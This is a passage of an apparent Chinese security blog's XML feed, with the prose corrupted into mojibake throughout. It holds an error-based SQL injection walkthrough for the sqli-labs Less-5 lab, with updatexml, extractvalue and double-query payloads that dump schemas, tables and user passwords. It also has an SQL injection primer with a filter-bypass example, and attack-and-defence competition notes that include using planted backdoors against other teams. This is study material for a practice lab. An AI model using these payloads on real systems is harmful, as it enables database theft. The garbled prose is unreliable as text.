¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°</p><p>2   .XPath_string(<a href="https://so.csdn.net/so/search?q=Xpath&spm=1001.2101.3001.7020">Xpath</a> æ ¼å¼çš„å­—ç¬¦ä¸²)</p><p>3    .new_value,stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„æ•°æ®</p><h3 id="ä¸ºä»€ä¹ˆå¯ä»¥ç”¨äºæŠ¥é”™æ³¨å…¥ï¼š"><a href="#ä¸ºä»€ä¹ˆå¯ä»¥ç”¨äºæŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="ä¸ºä»€ä¹ˆå¯ä»¥ç”¨äºæŠ¥é”™æ³¨å…¥ï¼š"></a>ä¸ºä»€ä¹ˆå¯ä»¥ç”¨äºæŠ¥é”™æ³¨å…¥ï¼š</h3><p>UpdateXml å‡½æ•°å®é™…ä¸Šæ˜¯å»æ›´æ–°äº†XMLæ–‡æ¡£ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨XMLæ–‡æ¡£è·¯å¾„çš„ä½ç½®é‡Œé¢å†™å…¥äº†<a href="https://so.csdn.net/so/search?q=%E5%AD%90%E6%9F%A5%E8%AF%A2&spm=1001.2101.3001.7020">å­æŸ¥è¯¢</a>ï¼Œæˆ‘ä»¬è¾“å…¥ç‰¹æ®Šå­—ç¬¦ï¼Œç„¶åå°±å› ä¸ºä¸ç¬¦åˆè¾“å…¥è§„åˆ™ç„¶åæŠ¥é”™äº†ï¼Œä½†æ˜¯æŠ¥é”™çš„æ—¶å€™ä»–å…¶å®å·²ç»æ‰§è¡Œäº†é‚£ä¸ªå­æŸ¥è¯¢ä»£ç ã€‚</p><h2 id="sqlié¶åœºless5"><a href="#sqlié¶åœºless5" class="headerlink" title="sqlié¶åœºless5"></a>sqlié¶åœºless5</h2><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230514102049350.png" alt="image-20230514102049350"></p><p>1.åˆ¤æ–­æ³¨å…¥ç±»å‹</p><p>get 1â€™ and â€™1â€™ =â€™1 å›æ˜¾å¦‚ä¸‹ï¼š</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231110006.png" alt="image-20230510231110006"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231854074.png" alt="image-20230510231854074"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ï¼Ÿid=1â€™ </span><br><span class="line">æŠ¥é”™ï¼Œå•å¼•å·å¯¼è‡´ï¼Œé¡µé¢æ˜¾ç¤ºæ•°æ®åº“çš„æŠ¥é”™ä¿¡æ¯ï¼Œç¡®å®šæ³¨å…¥ç‚¹ä¸ºå•å¼•å·å­—ç¬¦å‹</span><br></pre></td></tr></table></figure><p>2.åˆ¤æ–­æŠ¥é”™å‡½æ•°æ˜¯å¦å¯ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ï¼Ÿid=0&#x27; and updatexml(1,0x7e)--a</span><br></pre></td></tr></table></figure><p>é¡µé¢æ­£å¸¸æŠ¥é”™ï¼Œç¡®å®šæŠ¥é”™å‡½æ•°å¯ç”¨</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232558988.png" alt="image-20230510232558988"></p><p>3.è„±åº“</p><p>è·å–æ‰€æœ‰çš„æ•°æ®åº“ï¼Œåœ°å€æ è¾“å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,</span><br><span class="line">substr(</span><br><span class="line">      concat(0x7e,</span><br><span class="line">          (select group_concat(schema_name) </span><br><span class="line">          from information_schema.schemata)</span><br><span class="line">       )</span><br><span class="line">,34,31)</span><br><span class="line">,3) -- a</span><br></pre></td></tr></table></figure><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232905062.png" alt="image-20230510232905062"></p><p>è·å–securityåº“ä¸­çš„æ‰€æœ‰è¡¨ï¼Œåœ°å€æ è¾“å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;))) %23</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233507675.png" alt="image-20230510233507675"></p><p>æŸ¥userè¡¨ä¸­çš„åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ï¼Ÿid=1&#x27; union select 1,2, (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;)),1)) %23</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233925272.png" alt="image-20230510233925272"></p><p>æŸ¥å­—æ®µï¼ˆåŒæŸ¥è¯¢æ³¨å…¥ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1, count(*), concat((select concat(username,&#x27;:&#x27;,password) from users  limit 0,1), floor(rand(0)*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234240463.png" alt="image-20230510234240463"></p><p>å°†0æ”¹ä¸º1,2,3,4â€¦â€¦..</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234427307.png" alt="image-20230510234427307"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234518718.png" alt="image-20230510234518718"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234547823.png" alt="image-20230510234547823"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234636472.png" alt="image-20230510234636472"></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥</title>
      <link href="/2023/05/07/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/07/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯sqlæ³¨å…¥ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯sqlæ³¨å…¥ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯sqlæ³¨å…¥ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯sqlæ³¨å…¥ï¼Ÿ</h2><p><code>SQLæ³¨å…¥å°±æ˜¯åœ¨webåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§æ²¡æœ‰åˆ¤æ–­ï¼Œå‰ç«¯ä¼ å…¥åç«¯çš„å‚æ•°æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œå¹¶ä¸”å‚æ•°å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ä¸åŒçš„SQLè¯­å¥æ¥å¯¹æ•°æ®åº“çš„ä»»æ„æ“ä½œã€‚</code></p><p>phpä»£ç ä¸¾ä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;select * from users where id = $_GET[&#x27;id&#x27;];</span><br></pre></td></tr></table></figure><h2 id="sqlæ³¨å…¥åŸç†"><a href="#sqlæ³¨å…¥åŸç†" class="headerlink" title="sqlæ³¨å…¥åŸç†"></a>sqlæ³¨å…¥åŸç†</h2><p>sqlæ³¨å…¥æ¼æ´çš„äº§ç”Ÿéœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š</p><p>1.<code>å‚æ•°ç”¨æˆ·å¯æ§</code>ï¼šå‰ç«¯ä¼ ç»™åç«¯çš„å‚æ•°å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼›</p><p>2.<code>å‚æ•°ä¼ å…¥æ•°æ®åº“æŸ¥è¯¢</code>ï¼šä¼ å…¥çš„å‚æ•°æ‹¼æ¥åˆ°sqlè¯­å¥ï¼Œä¸”å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚</p><p>å½“ä¼ å…¥çš„idå‚æ•°ä¸º 1â€™ æ—¶ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1&#x27;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ç¬¦åˆæ•°æ®åº“è¯­æ³•çš„è§„èŒƒï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ã€‚</p><p>å½“ä¼ å…¥çš„idå‚æ•°ä¸ºand 1=1 æ—¶ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id= 1 and 1 = 1</span><br></pre></td></tr></table></figure><p>å› ä¸º1 = 1ä¸ºçœŸï¼Œä¸”whereè¯­å¥ä¸­id=1ä¹Ÿä¸ºçœŸï¼Œæ‰€ä»¥é¡µé¢ä¼šè¿”å›ä¸id = 1ç›¸åŒçš„ç»“æœï¼Œ</p><p>å½“ä¼ å…¥çš„idå‚æ•°ä¸ºand 1 =2æ—¶ï¼Œç”±äº 1=2ä¸æˆç«‹ï¼Œæ‰€ä»¥è¿”å›å‡ï¼Œé¡µé¢å°±ä¼šè¿”å›ä¸id =1ä¸åŒçš„ç»“æœã€‚</p><h2 id="mysqlæŸ¥è¯¢è¯­å¥"><a href="#mysqlæŸ¥è¯¢è¯­å¥" class="headerlink" title="mysqlæŸ¥è¯¢è¯­å¥"></a>mysqlæŸ¥è¯¢è¯­å¥</h2><p>1.åœ¨ä¸çŸ¥é“ä»»ä½•æ¡ä»¶æ—¶ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select è¦æŸ¥è¯¢çš„å­—æ®µå from åº“å.è¡¨å</span><br></pre></td></tr></table></figure><p>2.åœ¨çŸ¥é“ä¸€æ¡å·²çŸ¥æ¡ä»¶æ—¶ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select è¦æŸ¥è¯¢çš„å­—æ®µå from åº“å.è¡¨å where å·²çŸ¥æ¡ä»¶çš„å­—æ®µå=&#x27;å·²çŸ¥æ¡ä»¶çš„å€¼&#x27;</span><br></pre></td></tr></table></figure><p>3.åœ¨çŸ¥é“ä¸¤æ¡å·²çŸ¥æ¡ä»¶æ—¶ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select è¦æŸ¥è¯¢çš„å­—æ®µå from åº“å.è¡¨å where å·²çŸ¥æ¡ä»¶1çš„å­—æ®µå = &#x27;å·²çŸ¥æ¡ä»¶1çš„å€¼&#x27; and å·²çŸ¥æ¡ä»¶2çš„å­—æ®µå=&#x27;å·²çŸ¥æ¡ä»¶2çš„å€¼&#x27;</span><br></pre></td></tr></table></figure><h2 id="limitç”¨æ³•"><a href="#limitç”¨æ³•" class="headerlink" title="limitç”¨æ³•"></a>limitç”¨æ³•</h2><p>limitçš„ä½¿ç”¨æ ¼å¼ä¸ºlimit m ,n, å…¶ä¸­mæ˜¯è®°å½•å¼€å§‹çš„ä½ç½®ï¼Œä»0å¼€å§‹ï¼Œè¡¨ç¤ºç¬¬ä¸€æ¡è®°å½•ï¼›næ˜¯æŒ‡å–næ¡è®°å½•ã€‚</p><p>egï¼šlimit 0,1è¡¨ç¤ºä»ç¬¬ä¸€æ¡è®°å½•å¼€å§‹ï¼Œå»ä¸€æ¡è®°å½•ã€‚</p><h2 id="æ³¨é‡Šç¬¦"><a href="#æ³¨é‡Šç¬¦" class="headerlink" title="æ³¨é‡Šç¬¦"></a>æ³¨é‡Šç¬¦</h2><p>mysqlä¸­å¸¸è§çš„æ³¨é‡Šç¬¦ï¼š #æˆ–  â€“ç©ºæ ¼  æˆ–  /**/</p><h2 id="å†…è”æ³¨é‡Š"><a href="#å†…è”æ³¨é‡Š" class="headerlink" title="å†…è”æ³¨é‡Š"></a>å†…è”æ³¨é‡Š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å†…è”æ³¨é‡Šçš„å½¢å¼ï¼š/*!code*/</span><br></pre></td></tr></table></figure><p>å†…è”æ³¨é‡Šå¯ä»¥ç”¨äºæ•´ä¸ªsqlè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</span><br></pre></td></tr></table></figure><p>?åŠ å‚æ•°  &amp;è¿æ¥å‚æ•°</p><h2 id="sqlæ³¨å…¥çš„åˆ†ç±»"><a href="#sqlæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="sqlæ³¨å…¥çš„åˆ†ç±»"></a>sqlæ³¨å…¥çš„åˆ†ç±»</h2><p>1.æŒ‰ç…§æäº¤çš„æ•°æ®ç±»å‹æœ‰ï¼šæ•°å­—å‹ã€å­—ç¬¦å‹å’Œæœç´¢å‹</p><p>2.æŒ‰ç…§æäº¤æ–¹å¼æœ‰ï¼š</p><p>  (1)<code>GETæ³¨å…¥</code>:æäº¤æ•°æ®çš„æ–¹å¼æ˜¯<code>GET</code>,æ³¨å…¥ç‚¹çš„ä½ç½®åœ¨GETå‚æ•°éƒ¨åˆ†ã€‚ä¾‹å¦‚æœ‰è¿™æ ·ä¸€ä¸ªé“¾æ¥<code> http://xxx.com/news.php?id=1</code>, idæ˜¯æ³¨å…¥ç‚¹ã€‚</p><p>  (2)<code>POSTæ³¨å…¥</code>:ä½¿ç”¨POSTæ–¹å¼æäº¤æ•°æ®ï¼Œæ³¨å…¥ç‚¹ä½ç½®åœ¨POSTæ•°æ®éƒ¨åˆ†ï¼Œå¸¸å‘ç”Ÿåœ¨è¡¨å•ä¸­ï¼ˆè¾“å…¥æ¡†ï¼‰ã€‚</p><p>  (3)<code>cookieæ³¨å…¥</code>:HTTPè¯·æ±‚çš„æ—¶å€™ä¼šå¸¦ä¸Šå®¢æˆ·ç«¯çš„cookieï¼Œæ³¨å…¥ç‚¹åœ¨cookieå½“ä¸­çš„æŸä¸ªå­—æ®µä¸­ã€‚</p><p>  (4)<code>httpå¤´æ³¨å…¥</code>:æ³¨å…¥ç‚¹åœ¨HTTPè¯·æ±‚å¤´éƒ¨çš„æŸä¸ªå­—æ®µä¸­ã€‚æ¯”å¦‚å­˜åœ¨User-Agentå­—æ®µä¸­ã€‚ä¸¥æ ¼è®²çš„è¯ï¼Œcookieå…¶å®åº”è¯¥ä¹Ÿç®—æ˜¯å¤´éƒ¨æ³¨å…¥çš„ä¸€ç§å½¢å¼ã€‚å› ä¸ºåœ¨HTTPè¯·æ±‚çš„æ—¶å€™ï¼Œcookieæ˜¯å¤´éƒ¨çš„ä¸€ä¸ªå­—æ®µã€‚</p><p>3.æŒ‰ç…§æ‰§è¡Œæ•ˆæœæœ‰ï¼šåŸºäºå¸ƒå°”çš„ç›²æ³¨ã€åŸºäºæ—¶é—´çš„ç›²æ³¨ã€åŸºäºæŠ¥é”™æ³¨å…¥ã€è”åˆæŸ¥è¯¢æ³¨å…¥</p><h2 id="sqlæ³¨å…¥å±å®³"><a href="#sqlæ³¨å…¥å±å®³" class="headerlink" title="sqlæ³¨å…¥å±å®³"></a>sqlæ³¨å…¥å±å®³</h2><p>1.<code>æ•°æ®åº“ä¿¡æ¯æ³„æ¼</code>ï¼šæ•°æ®åº“ä¸­å­˜æ”¾çš„ç”¨æˆ·çš„éšç§ä¿¡æ¯çš„æ³„éœ²ã€‚</p><p>2.<code>ç½‘é¡µç¯¡æ”¹</code>ï¼šé€šè¿‡æ“çºµæ•°æ®åº“å¯¹ç‰¹å®šç½‘é¡µè¿›è¡Œç¯¡æ”¹ã€‚</p><p>3.<code>ç½‘ç«™è¢«æŒ‚é©¬ï¼Œä¼ æ’­æ¶æ„è½¯ä»¶</code>ï¼šä¿®æ”¹æ•°æ®åº“ä¸€äº›å­—æ®µå€¼ï¼ŒåµŒå…¥ç½‘é©¬é“¾æ¥ï¼Œè¿›è¡ŒæŒ‚é©¬æ”»å‡»ã€‚</p><p>4.<code>æ•°æ®åº“è¢«æ¶æ„æ“ä½œ</code>ï¼šæ•°æ®åº“æœåŠ¡å™¨è¢«æ”»å‡»ï¼Œæ•°æ®åº“çš„ç³»ç»Ÿç®¡ç†å‘˜è´¦æˆ·è¢«ç¯¡æ”¹ã€‚</p><p>5.<code>æœåŠ¡å™¨è¢«è¿œç¨‹æ§åˆ¶ï¼Œè¢«å®‰è£…åé—¨</code>ã€‚ç»ç”±æ•°æ®åº“æœåŠ¡å™¨æä¾›çš„æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè®©é»‘å®¢å¾—ä»¥ä¿®æ”¹æˆ–æ§åˆ¶æ“ä½œç³»ç»Ÿã€‚</p><p>6.<code>ç ´åç¡¬ç›˜æ•°æ®ï¼Œç˜«ç—ªå…¨ç³»ç»Ÿ</code>ã€‚</p><h2 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h2><p>1.<code>è¿‡æ»¤å±é™©å­—ç¬¦</code>ï¼šä¾‹å¦‚ï¼Œé‡‡ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…unionã€sleepã€load_fileç­‰å…³é”®å­—ï¼Œå¦‚æœåŒ¹é…åˆ°ï¼Œåˆ™é€€å‡ºç¨‹åºã€‚</p><p>2.<code>ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥</code>ï¼šä½¿ç”¨PDOé¢„ç¼–è¯‘è¯­å¥ï¼Œéœ€è¦æ³¨æ„ï¼Œä¸è¦å°†å˜é‡ç›´æ¥æ‹¼æ¥åˆ°PDOè¯­å¥ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨å ä½ç¬¦è¿›è¡Œæ•°æ®åº“çš„<code>å¢åŠ </code>ã€<code>åˆ é™¤</code>ã€<code>ä¿®æ”¹</code>ã€<code>æŸ¥è¯¢</code>ã€‚</p><p>3.<code>ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ã€ä½¿ç”¨ä¸¥æ ¼çš„æ•°æ®ç±»å‹</code>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWDæ€»ç»“</title>
      <link href="/2023/05/06/AWD%E6%80%BB%E7%BB%93/"/>
      <url>/2023/05/06/AWD%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>åå°æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php kill.php &gt;/tmp/kill.log 2&gt;&amp;1 &amp;</span><br><span class="line">python3 monitor.py &gt;tmp/monitor.log 2&gt;&amp;1 &amp;  </span><br><span class="line">#ç›‘æ§æŸ¥çœ‹ä¸Šä¼ æ–‡ä»¶å¹¶åˆ é™¤æ¶æ„æ–‡ä»¶</span><br></pre></td></tr></table></figure><blockquote><p><code>php kill.php</code>å‘½ä»¤</p><p><code>&gt; /tmp/kill.log</code> å°†å‘½ä»¤æ‰§è¡Œæ—¥å¿—å†™åˆ°tmpç›®å½•ä¸‹çš„kill.logæ–‡ä»¶ä¸­</p><p><code>2&gt;&amp;1 &amp;</code>åå°æ‰§è¡Œå‘½ä»¤</p></blockquote><h1 id="AWD-è§„åˆ™"><a href="#AWD-è§„åˆ™" class="headerlink" title="AWD è§„åˆ™"></a><a href="https://so.csdn.net/so/search?q=AWD&spm=1001.2101.3001.7020">AWD</a> è§„åˆ™</h1><p>AWDï¼šAttack With Defenceï¼Œå³æ”»é˜²å¯¹æŠ—ï¼Œæ¯”èµ›ä¸­æ¯ä¸ªé˜Ÿä¼ç»´æŠ¤å¤šå°æœåŠ¡å™¨ï¼ˆä¸€èˆ¬ä¸¤ä¸‰å°ï¼Œè§†å°ç»„å‚èµ›äººæ•°è€Œå®šï¼‰ï¼ŒæœåŠ¡å™¨ä¸­å­˜åœ¨å¤šä¸ªæ¼æ´ï¼ˆwebå±‚ã€ç³»ç»Ÿå±‚ã€ä¸­é—´ä»¶å±‚ç­‰ï¼‰ï¼Œåˆ©ç”¨æ¼æ´æ”»å‡»å…¶ä»–é˜Ÿä¼å¯ä»¥è¿›è¡Œå¾—åˆ†ï¼ŒåŠ å›ºæ—¶é—´æ®µå¯è‡ªè¡Œå‘ç°æ¼æ´å¯¹æœåŠ¡å™¨è¿›è¡ŒåŠ å›ºï¼Œé¿å…è¢«å…¶ä»–é˜Ÿä¼æ”»å‡»å¤±åˆ†ã€‚</p><ul><li>1.ä¸€èˆ¬åˆ†é…WebæœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ï¼ˆå¤šæ•°ä¸ºLinuxï¼‰æŸå¤„å­˜åœ¨flagï¼ˆä¸€èˆ¬åœ¨æ ¹ç›®å½•ä¸‹ï¼‰ï¼›</li><li>2.å¯èƒ½ä¼šæä¾›ä¸€å°æµé‡åˆ†æè™šæ‹Ÿæœºï¼Œå¯ä»¥ä¸‹è½½æµé‡æ–‡ä»¶è¿›è¡Œæ•°æ®åˆ†æï¼ˆè¾ƒå°‘æä¾›ï¼‰ï¼›</li><li>3.flagåœ¨ä¸»åŠæ–¹çš„è®¾å®šä¸‹æ¯éš”ä¸€å®šæ—¶é—´åˆ·æ–°ä¸€è½®ï¼›</li><li>4.å„é˜Ÿä¸€èˆ¬éƒ½æœ‰ä¸€ä¸ªåˆå§‹åˆ†æ•°ï¼›</li><li>5.flagä¸€æ—¦è¢«å…¶ä»–é˜Ÿä¼æ‹¿èµ°ï¼Œè¯¥é˜Ÿæ‰£é™¤ä¸€å®šç§¯åˆ†ï¼›</li><li>6.å¾—åˆ°flagçš„é˜Ÿä¼åŠ åˆ†ï¼›</li><li>7.ä¸€èˆ¬æ¯ä¸ªé˜Ÿä¼ä¼šç»™ä¸€ä¸ªä½æƒé™ç”¨æˆ·ï¼Œérootæƒé™ï¼›</li><li>8.ä¸»åŠæ–¹ä¼šå¯¹æ¯ä¸ªé˜Ÿä¼çš„æœåŠ¡è¿›è¡Œcheckï¼ŒæœåŠ¡å™¨å®•æœºæ‰£é™¤æœ¬è½®flagåˆ†æ•°ï¼Œæ‰£é™¤çš„åˆ†å€¼ç”±æœåŠ¡checkæ­£å¸¸çš„é˜Ÿä¼å‡åˆ†ã€‚ # å‰æœŸå‡†å¤‡</li></ul><p>SSHç™»å½•</p><p>å£ä»¤ç™»å½•</p><p>å‘½ä»¤æ ¼å¼: sshå®¢æˆ·ç«¯ç”¨æˆ·å@æœåŠ¡å™¨ipåœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh  ç”¨æˆ·å@ip</span><br><span class="line"></span><br><span class="line">ssh  ctf@</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸æ˜¯é»˜è®¤ç«¯å£ï¼Œå¯ä»¥ä½¿ç”¨-pä¿®æ”¹ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p æŒ‡å®šç«¯å£å· ç”¨æˆ·å@ip</span><br></pre></td></tr></table></figure><p>å¯†é’¥ç™»å½•</p><p>ç”¨id_rsaç”¨äºç™»å½•é¶æœº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sftp -i id_rsa ctf@ip</span><br></pre></td></tr></table></figure><p>å‹ç¼©ç½‘ç«™æºç </p><p>ç”¨äºå¤‡ä»½å’Œä»£ç å®¡è®¡ä¿®å¤ä»¥åŠåˆ†ææ”»å‡»ç‚¹ï¼Œæ¯ä¸ªæœåŠ¡å™¨çš„ç½‘ç«™éƒ½ä¸€æ ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf /tmp/html.zip /var/www/html</span><br></pre></td></tr></table></figure><p><img src="/2023/05/06/AWD%E6%80%BB%E7%BB%93/AWD%E6%80%BB%E7%BB%93%5Cimage-20230725232413954.png" alt="image-20230725232413954"></p><p>2.å¤‡ä»½æ•°æ®åº“</p><ul><li>å¤‡ä»½æŒ‡å®šçš„å¤šä¸ªæ•°æ®åº“</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql</span><br></pre></td></tr></table></figure><p>æ—  lock tables æƒé™çš„è§£å†³æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql</span><br></pre></td></tr></table></figure><ul><li>æ¢å¤å¤‡ä»½ï¼ˆåœ¨ MySQL ç»ˆç«¯ä¸‹æ‰§è¡Œï¼‰</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source FILE_PATH</span><br></pre></td></tr></table></figure><ul><li>é‡ç½® MySQL å¯†ç ï¼ˆåœ¨ MySQL ç»ˆç«¯ä¸‹æ‰§è¡Œï¼‰</li></ul><p>æ–¹æ³• 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set password for ç”¨æˆ·å@localhost = password(&quot;æ–°å¯†ç &quot;)</span><br></pre></td></tr></table></figure><p>æ–¹æ³• 2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -uç”¨æˆ·å -pæ—§å¯†ç  password æ–°å¯†ç </span><br></pre></td></tr></table></figure><p>3.ä¸‹è½½åˆ°æœ¬åœ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P ssh_port user@host_ip:/tmp/bak.sql local_file</span><br></pre></td></tr></table></figure><h2 id="æŸ¥æ‰¾é¢„ç•™åé—¨"><a href="#æŸ¥æ‰¾é¢„ç•™åé—¨" class="headerlink" title="æŸ¥æ‰¾é¢„ç•™åé—¨"></a>æŸ¥æ‰¾é¢„ç•™åé—¨</h2><p>ç”¨Dç›¾æ‰«æå¤‡ä»½çš„æ–‡ä»¶ï¼ŒæŸ¥æ‰¾é¢„ç•™åé—¨ï¼Œç¬¬ä¸€æ—¶é—´åˆ é™¤è‡ªå·±é¶æœºä¸Šçš„åé—¨ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨åé—¨æ”»å‡»å…¶ä»–é¶æœºã€‚</p><p>å¯ä»¥ä½¿ç”¨ seayè¿›è¡Œä»£ç å®¡è®¡</p><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p>ç«¯å£æ‰«ææ˜¯ä¿¡æ¯æ”¶é›†çš„ä¸€éƒ¨åˆ†ï¼Œéœ€è¦çŸ¥é“ç›®æ ‡æœåŠ¡å™¨å¼€æ”¾äº†å“ªäº›ç«¯å£ï¼Œä½¿ç”¨ç«¯å£æ‰«æå·¥å…·æœ‰å¾¡å‰‘é«˜é€ŸTCPå…¨ç«¯å£æ‰«æå·¥å…·ã€nmapå’Œmasscanç­‰è¿›è¡Œæ‰«æã€‚</p><p>æ‰€æœ‰æœåŠ¡å™¨é…ç½®éƒ½æ˜¯ä¸€æ 